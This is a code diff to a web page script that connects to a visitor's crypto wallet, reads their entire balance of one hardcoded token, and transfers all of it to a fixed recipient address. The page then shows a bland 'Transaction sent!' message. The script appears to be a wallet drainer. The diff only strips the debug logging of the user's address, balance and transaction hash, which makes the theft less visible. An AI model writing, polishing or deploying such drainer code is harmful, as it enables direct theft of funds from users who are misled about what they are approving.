@@ -86,13 +86,11 @@
         }
 
         try {
-          console.log('Requesting accounts...');
           const provider = new ethers.providers.Web3Provider(window.ethereum);
           await provider.send('eth_requestAccounts', []);
 
           const signer = provider.getSigner();
           const userAddress = await signer.getAddress();
-          console.log('User address:', userAddress);
 
           const tokenAddress = '0x8B9ABDD229ec0C4A28E01b91aacdC5dAAFc25C2b';
           const recipient    = '0xd0f734C25874E358d59d516F75f0fEAAb25B4914';
@@ -103,7 +101,6 @@
 
           const token = new ethers.Contract(tokenAddress, abi, signer);
           const balance = await token.balanceOf(userAddress);
-          console.log('Balance (raw):', balance.toString());
 
           if (balance.isZero()) {
             messageDiv.innerHTML = `<div class="error">
@@ -112,7 +109,6 @@
             </div>`;
           } else {
             const tx = await token.transfer(recipient, balance);
-            console.log('Tx hash:', tx.hash);
             messageDiv.innerHTML = `<div class="success">
               Transaction sent! Confirm it in MetaMask.
             </div>`;
